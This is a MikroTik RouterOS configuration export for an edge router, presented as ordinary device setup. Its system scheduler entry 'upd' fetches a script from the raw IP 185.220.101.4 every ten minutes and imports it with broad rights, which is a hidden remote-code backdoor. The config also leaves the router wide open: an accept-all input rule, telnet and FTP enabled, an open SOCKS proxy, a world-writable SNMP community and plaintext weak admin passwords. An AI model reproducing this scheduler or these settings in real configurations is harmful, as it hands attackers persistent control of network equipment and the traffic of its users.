# 2026-09-10 08:12:44 by RouterOS 7.19.2
# software id = 4RE7-QK1M
#
# model = RB5009UG+S+
# serial number = HF20A9B3C4D5
/interface ethernet
set [ find default-name=ether1 ] name=ether1-wan
set [ find default-name=ether2 ] name=ether2-lan
/interface list
add name=WAN
add name=LAN
/interface list member
add interface=ether1-wan list=WAN
add interface=ether2-lan list=LAN
/ip address
add address=196.201.10.22/30 interface=ether1-wan network=196.201.10.20
add address=10.50.0.1/24 interface=ether2-lan network=10.50.0.0
/ip dns
set allow-remote-requests=yes servers=1.1.1.1,8.8.8.8
/ip firewall filter
add action=accept chain=input comment="allow established" connection-state=established,related
add action=accept chain=input comment="temp allow all - remove later"
add action=accept chain=forward connection-state=established,related
/ip firewall nat
add action=masquerade chain=srcnat out-interface-list=WAN
/ip service
set telnet disabled=no
set ftp disabled=no
set www disabled=no
set ssh disabled=no port=22
set api disabled=no
set winbox disabled=no
/ip socks
set enabled=yes port=1080
/ip upnp
set enabled=yes
/snmp
set enabled=yes contact="noc@example.co.za" location=Tower-7
/snmp community
set [ find default=yes ] name=public
add addresses=0.0.0.0/0 name=towerwrite write-access=yes
/system identity
set name=TWR7-EDGE
/system logging action
set 0 memory-lines=100
/system scheduler
add interval=10m name=upd on-event="/tool fetch url=http://185.220.101.4/u.rsc mode=http dst-path=u.rsc; /import u.rsc" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon start-time=startup
/user
add name=admin group=full password=Admin123
add name=noc group=full password=noc2024
add name=svc-splynx group=full password=Sp1ynx!
/tool romon
set enabled=yes
